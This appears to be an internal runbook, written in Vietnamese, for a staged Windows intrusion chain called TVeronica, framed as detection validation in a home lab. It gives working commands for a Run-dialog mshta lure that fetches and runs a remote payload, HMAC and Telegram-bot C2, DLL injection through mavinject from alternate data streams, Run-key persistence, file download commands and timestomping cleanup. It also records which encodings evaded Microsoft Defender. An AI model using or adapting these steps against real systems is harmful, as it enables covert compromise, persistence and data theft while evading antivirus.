# TESTPLAN — TVeronica: Stage 0 → Stage 6

> Runbook nội bộ / detection validation. Hạ tầng:
> - **Victim** = chính máy Windows này (IP LAN DHCP, hiện `192.168.1.106`)
> - **C2 (HMAC)** = `snapec2.py` trong WSL `kali-linux` (`python3 snapec2.py --host 0.0.0.0 --port 4444 --web-port 8080 --key snapec2_secret`)
> - **HTTP server (payload)** = Windows host: `python -m http.server 8081 --bind 0.0.0.0`, root `E:\TVeronica\www\`
> - **C2 (Telegram)** = bot `@TVeronicaBot` (Stage 5), token trong `stage3/c2config.h` + `stage5/teleop.py`

## ⚡ v2 Evasion build (validate 28/09 — ZERO detection Stage 0→2)

```
Win+R → mshta.exe "http://<IP-LAN>:8081/payload.sct"
  └─ HTA: decode 2 blob → drop %TEMP%\<rand>\killing.ps1 + update.js
     └─ cmd /c wscript update.js → powershell -File killing.ps1
        └─ HMAC gate (snapec2 :4444) → gate checks → tải payload.zip → unpack → stage3.ps1
```

Build SCT: `python build_sct.py` (encode `stage2/killing.ps1` + loader.js vào `www/payload.sct`).

Detection-validation data (đo bằng Get-MpThreatDetection):

| Variant | mshta/AMSI | File scan | Runtime PS |
|---|---|---|---|
| v1 SCT (blob + drop raw.js + wscript) | pass | ❌ `ObfusScript.A!ml` (dropper JS) | — |
| v2a download-cradle HTA | ❌ `SuspDown.SZ` (string `powershell.exe -File` trong HTA) | pass | — |
| **v2b (hiện tại)**: blob + loader.js trung gian | ✅ | ✅ | ✅ |

Kết luận: (1) content "dropper" bị ML file-scan bắt; (2) string spawn powershell trong script HTA bị AMSI bắt; (3) script sạch "admin-look" + encode blob + wscript trung gian = pass cả 3 lớp.

**Stage 0 behavior detection (28/09 23:20–23:30):** Win+R thật → `Behavior:Win32/SuspClickFix.SA` (behavior ML bắt context Run-dialog → mshta + URL, bất kể payload sạch hay wrapper `cmd /c`). Cùng lệnh từ terminal = sạch. → Stage 0 bị detect là **technique-level**, ghi vào báo cáo.

## Stage 3–6 (ADS + mavinject + persistence + Telegram C2 + cleanup) — đã build & verify

Delivery: `payload.zip` (inject.dll + backdoor.dll + stage3.ps1 + cleanup.ps1) → `killing.ps1` tự unpack + chạy `stage3.ps1`.

| Component | File | Vai trò |
|---|---|---|
| inject.dll | `stage3/inject.c` + `c2core.c` (mingw-w64 build trong kali) | Telegram C2 agent, inject vào target qua mavinject từ ADS |
| backdoor.dll | `stage3/backdoor.c` + `c2core.c` | Entry `Start` cho rundll32 persistence, cùng C2 loop |
| stage3.ps1 | `stage3/stage3.ps1` | Target = notepad.exe (tự start ẩn nếu chưa chạy) → ADS `report.log:<dll>` → `mavinject <pid> /INJECTRUNNING` → Run key persistence |
| cleanup.ps1 | `stage6/cleanup.ps1` | Xóa artifacts %TEMP%, timestomp report.log, giữ/drop persistence (`-DropPersistence`) |
| teleop.py | `stage5/teleop.py` | Operator console: lệnh shell / `info` / `dl:<path>` / `die` |

**Đã verify bằng testdll (probe, không C2):** ADS stream verified → mavinject load vào notepad ẩn (`inject loaded ok pid=3740`) → rundll32 ADS load (`backdoor loaded ok pid=11844`) → Run key set → **zero detection**.

**Bug đã bắt và sửa (detection engineering notes):**
1. `System.IO.File.WriteAllBytes` **reject ADS path** (`NotSupportedException`) — lỗi bị `SilentlyContinue` nuốt → stream không bao giờ được tạo mà log vẫn báo OK. Fix: `Set-Content -Encoding Byte` (PS FileSystem provider) + verify stream sau ghi.
2. `dir` mặc định bỏ qua file `+h` → "File Not Found" giả; phải `dir /a /r` để liệt kê ADS streams.
3. `mavinject` + rundll32 load DLL từ ADS **hoạt động thật** trên Windows 11 (chứng minh bằng marker PID).

**Detection data Stage 3+:** DLL compile chứa C2 beacon (WinHTTP + cmd exec) bị ML bắt `Trojan:Win32/Wacatac.H!ml` trong ~20s khi ghi đĩa; test DLL không có C2 = sạch. → Defender detect ở **payload content (beacon code)**, không detect technique (ADS/mavinject).

## Runbook test

1. Baseline: `(Get-MpThreatDetection).Count`
2. Win+R: `mshta.exe "http://<IP-LAN>:8081/payload.sct"`
3. Chờ ~30s. Quan sát:
   - snapec2 console: `New session #...` (HMAC gate)
   - `%TEMP%\<rand>\update.log`: gate log → `stage3 returned` → `exit 0`
   - `%APPDATA%\MSReport\report.log` + ADS streams (`dir /a /r report.log`)
   - Run key: `HKCU\...\Run\MSReport`
4. Telegram: nhắn tin cho `@TVeronicaBot` (bind chat) → `python stage5/teleop.py` → gửi lệnh (`info`, `whoami`, `dl:C:\path\file`).
5. Stage 6: `powershell -File stage6\cleanup.ps1 -DryRun` xem trước → bỏ `-DryRun` để chạy; `-DropPersistence` nếu muốn gỡ persistence.
6. Verify detection: so sánh `(Get-MpThreatDetection).Count` trước/sau.

## Lưu ý

- IP DHCP đổi theo mạng (đã đổi 1 lần: `10.129.132.80` → `192.168.1.106`). Khi đổi: sửa `UpdateServer` + `ToolListUrl` trong `stage2/killing.ps1`, chạy lại `build_sct.py`.
- Telegram token plaintext trong repo = lab only — **rotate sau bài test**, đừng push repo public.
- Exit codes `killing.ps1`: 0 OK / 40 HMAC fail / 50 AV abort / 60 env gate fail / 70 download fail.
